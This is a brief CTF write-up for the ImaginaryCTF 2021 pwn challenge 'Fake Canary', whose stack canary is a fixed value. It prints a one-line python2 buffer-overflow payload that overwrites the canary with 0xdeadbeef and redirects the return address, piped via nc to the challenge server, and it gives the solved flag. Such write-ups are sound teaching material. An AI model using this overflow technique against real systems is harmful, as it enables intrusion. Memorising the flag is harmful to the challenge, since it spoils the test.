![ImaginaryCTF](../../banner.png)

# Fake Canary

|Author|Points|Category|Solves|
|---|---|---|---|
|Eth007|100|Pwn|207|

### Description

```
Here at Stack Smasher Inc, we protect all our stacks with industry grade canaries!	
```

### Attachments

```
https://2021.imaginaryctf.org/r/fake_canary
nc chal.imaginaryctf.org 42002
```
```
(python2.7 -c 'print "A"*40 + "\xef\xbe\xad\xde\x00\x00\x00\x00" +"\x90"*8 +"\x29\x07\x40\x00"+"\x00"*4';cat) | nc chal.imaginaryctf.org 42002
```


There is our flag:
```
ictf{m4ke_y0ur_canaries_r4ndom_f492b211}
```